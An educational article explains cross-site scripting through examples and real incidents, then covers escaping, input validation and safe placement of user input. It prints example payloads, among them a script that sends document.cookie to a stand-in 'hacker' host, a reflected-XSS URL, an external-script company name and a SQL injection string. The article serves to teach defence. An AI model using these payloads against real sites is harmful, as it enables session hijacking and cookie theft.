# XSS — what is it and how to protect yourself?

![Exploits of a Mom](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)



## Briefly about XSS vulnerabilities

What is XSS? How to search? How to understand if there is XSS or not? We'll figure it out now. Let's go!

**XSS (Cross-Site Scripting)** — the ability to execute arbitrary JavaScript code in the victim's browser in the context of your site.

XSS is one of the most common vulnerabilities in the web. More than 95% of web applications are vulnerable to XSS. To find a bug, it is not necessary to have special skills, take courses or get a higher education.

Indeed, despite the fact that XSS is a common vulnerability, it remains one of the most serious client vulnerabilities.



## How does XSS work?

![Cross-site scripting](cross-site-scripting.svg)

Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.



## XSS examples 

**Example 1.**
For example, the HTML snippet:

```html
<title>Example document: %(title)</title>
```

is intended to illustrate a template snippet that, if the variable title has value [Cross-Site Scripting](https://www.veracode.com/blog/2012/07/what-is-cross-site-scripting), results in the following HTML to be emitted to the browser:

```html
<title>Example document: XSS Doc</title>
```


A site containing a search field does not have the proper input sanitizing. By crafting a search query looking something like this:

```html
"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
```


sitting on the other end, at the web server, you will be receiving hits where after a double space is the user's cookie. If an administrator clicks the link, an attacker could steal the session ID and hijack the session.

 

**Example 2.**
Suppose there's a URL on Google's site, `*http://www.google.com/search?q=flowers*`, which returns HTML documents containing the fragment

```html
<p>Your search for 'flowers' returned the following results:</p>
```

i.e., the value of the query parameter q is inserted into the page returned by Google. Suppose further that the data is not validated, filtered or escaped. 
Evil.org could put up a page that causes the following URL to be loaded in the browser (e.g., in an invisible*<iframe>*):

```html
http://www.google.com/search?q=flowers+%3Cscript%3Eevil_script()%3C/script%3E
```

When a victim loads this page from [www.evil.org](https://www.veracode.com/security/xss#), the browser will load the iframe from the URL above. The document loaded into the iframe will now contain the fragment

```html
<p>Your search for 'flowers <script>evil_script()</script>'
```

```html
returned the following results:</p>
```


Loading this page will cause the browser to execute *evil_script()*. Furthermore, this script will execute in the context of a page loaded from *www.google.com.*

 

## The real story with the British Register of Companies

On October 20, a certain Jim Walker shared an interesting observation on the forum of developers of the British state register of companies Companies House. Companies House allows the characters < and > in company names. This opens up scope for attacks on those sites that do not filter and do not screen control characters in the correct way. If the site displays the company name and does not synthesize data, then it is potentially vulnerable to an XSS attack.

Walker discovered that on October 16, a certain Michael John Tandy had registered a company with the name `"><SCRIPT SRC=HTTPS://MJT.XSS.HT></SCRIPT> LTD`. If there is no XSS filter, what is the company name embedding code on the web page that calls external JavaScript.

![img](https://habrastorage.org/r/w1560/webt/cp/-8/pl/cp-8plobwfxzzz724_jpguf9zfu.png)

On October 22, the regulator sent a warning to its partners about "company 12956509". The letter carefully avoids mentioning the real name. The company is called by the number in the database.

In the letter, employees give a brief educational program about the nature of XSS attacks and warn about possible security risks.

![img](https://habrastorage.org/r/w1560/webt/sy/qc/7f/syqc7f6wqc4odbw-kkw07zy9msi.png)

Companies House hid the company's name to the maximum. As noted on Twitter (X), even the statement about the institution 12956509 in the name field contained: "The name of the company is provided on request."

The culprit of the event himself appeared in Jim Walker's thread on October 23, three days after the discovery. Michael Tandy explained that it would be irresponsible for him to disclose information on a public forum, so he contacted Companies House through a technical support ticket.

Resources that receive information from the Companies House registry are vulnerable. Michael said that he is already contacting all the sites that called his script. As a security researcher complained, sites vulnerable to XSS rarely post contacts for communication and do not have an account on HackerOne-type services.

At the forum, Company House employees confirmed that they had received Tandy's messages. The name "company 12956509" was changed to *THAT COMPANY WHOSE NAME USED TO CONTAIN HTML SCRIPT TAGS LTD* (literally "the company whose name used to contain HTML tags"). It is unknown whether the vulnerability in Company House systems has been fixed. Perhaps the registry has introduced special restrictions on names.

It is not the first time that attempts to inject code are found in the Companies House registry. In 2016, a company with SQL injection appeared under the number 10542519: `; DROP TABLE "COMPANIES";-- LTD`



## XSS attack on Twitter (X)

In 2014, an Austrian teenager @firoxl was experimenting with his feed on Twitter, trying to make it display the Unicode ‘heart’ character. By doing so, he inadvertently discovered that Twitter’s feed was vulnerable to an XSS attack! @firoxl immediately reported the issue to Twitter, but it was too late. His discovery was already making rounds on social media.

Less than two hours after @froxl’s discovery, a German IT student @derGeruhn published a Tweet that exploited XSS to ... retweet itself. Thus, the self-retweeting tweet was released into the world. It retweeted itself hundreds of thousands of times and affected thousands of Twitter accounts, including @NYTimes and @BBCBreaking. To end its reign, Twitter had to take their whole feed offline.

On the left you will find an image that shows the content of the self-retweeting tweet. The tweet contains malicious JavaScript code which gets executed every time someone views the tweet in their feed. The script accesses the HTML of the Twitter page, finds the “retweet” button, and presses it to retweet itself.

![A self-retweeting tweet](https://images.ctfassets.net/4un77bcsnjzw/3ho0b9vT3FYIBKWiWGe0bu/3a387ca01b12ac1010ae6f2fa9546cb6/tweetdeck-hacked.png)



## XSS mitigation

### 1. Find places where user input gets injected into a response

XSS is extremely popular for a reason: we programmers very often inject user-supplied data into the responses we send back to users. The first step to mitigate XSS is to find all places in your code where this pattern occurs. Input data might be coming from a database or directly from a user request. Any data which might have originated from a user at any point in the past is a suspect.



### 2. Escape the output

Having identified all the places where XSS might be happening, it’s time to get your hands dirty and code your way out of danger. The first and the most important XSS mitigation step is to escape your HTML output. To do that, you should HTML-encode all dangerous characters in the user-controlled data before injecting that data into your HTML output.

For example, when HTML-encoded, the character `<` becomes `&lt`, and the character `&` becomes `&amp` etc. This way, the browser will safely handle the HTML-encoded characters, i.e. it will not assume they are part of the HTML structure of your page.

Remember to encode all dangerous characters. Don’t assume only a subset of characters needs to be escaped for your specific use case. Bad guys are very creative and will always find ways to bypass your assumptions.

Instead of writing an escape function by yourself, use a well-proven library such as [lodash.escape](https://www.npmjs.com/package/lodash.escape).

![XSS mitigation where a hacker tries to inject a malicious script but the script's content is escaped](https://images.ctfassets.net/4un77bcsnjzw/1ABjVui53sICnyiBxPduPO/6efb664e2b908f2f394abc8ca755dd6a/XSS_Mitigation.svg)

```javascript
import escape from 'lodash.escape';

function handleMessageSend(messageId, senderEmail, messageContent)  {
  database.save(messageId, senderEmail, messageContent);
}

function generateMessageHTML(messageId) {
  let messageContent = database.loadContent(messageId);
  let escapedContent = escape(messageContent);
  return `<p class="messageContent">${escapedContent}</p>`;
}
```



### 3. Perform input validation

Be as strict as possible with the data you receive from your users. Before including user-controlled data in an HTTP response or writing it to a database, validate it is in the format you expect. Never rely on blocklisting—the bad guys will always find ways to bypass it!

For instance, in our chat application, we expect the messageId to be a valid UUID and the senderEmail to be a valid email. Note that in the example we changed generateMessageHTML to generateSenderHTML. This demonstrates two layers of defence to prevent XSS with the senderEmail parameter: we both validate it before saving it to a database and later escape it when injecting it into HTML.

We can use validator.js, which has validation functions for many common data types.

```javascript
import escape from 'lodash.escape';
import isEmail from 'validator/lib/isEmail.js';
import isUUId from 'validator/lib/isUUID.js';

function handleMessageSend(messageId, senderEmail, messageContent)  {
  if (!isUUId(messageId)) {
    throw new Error("validation of messageId parameter failed");
  }

  if (!isEmail(senderEmail)) {
    throw new Error("validation of email parameter failed");
  }

  database.save(messageId, senderEmail, messageContent);
}

function generateSenderHTML(messageId) {
  let messageSender = database.loadSender(messageId);
  let escapedSender = escape(messageSender);
  return `<div class="messageSender">${escapedSender}</div>`;
}
```



### 4. Don’t put user input in dangerous places

The above mitigation is effective against situations where user input is used as the content of an HTML element (e.g. `<div> user_input </div>` or `<p> user_input </p>` etc.). However, there are certain locations where you should never put a user-controlled input. These locations include:

- Inside the `<script>` tag
- Inside CSS (e.g. inside the `<style>` tag)
- Inside an HTML attribute (e.g. `<div attr=user_input>`)

There are some exceptions to the above rules, but explaining them goes beyond the scope of this lesson. If you do need to place user-controlled input inside any of the listed locations, please follow the [OWASP Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) for a more detailed advice.



## Some resources that describe ways to protect XSS

1. OWASP Foundation: The OWASP website provides an overview of XSS attacks and how to test for them. It also offers a set of reusable security components in several languages, including validation and escaping routines to prevent parameter tampering and the injection of XSS attacks.
2. Web Security Academy: This website explains what XSS is, how it works, and how to prevent it. It also provides examples of different types of XSS attacks, such as reflected, stored, and DOM-based XSS. 
3. TechTarget: This website provides a definition of XSS and how it works. It also explains how to prevent and fix it.
4. Trend Micro: This website explores the three types of XSS attacks: reflected, stored, and DOM-based. It also provides information on how to mitigate XSS vulnerabilities in your projects. 
5. Synopsys: This website explains what XSS is and how it works. It also provides examples of how attackers can initiate an XSS attack and the potential consequences of such an attack. 
6. Acunetix: This website explains what XSS is and how it works. It also provides information on the different types of XSS attacks and how to prevent them.
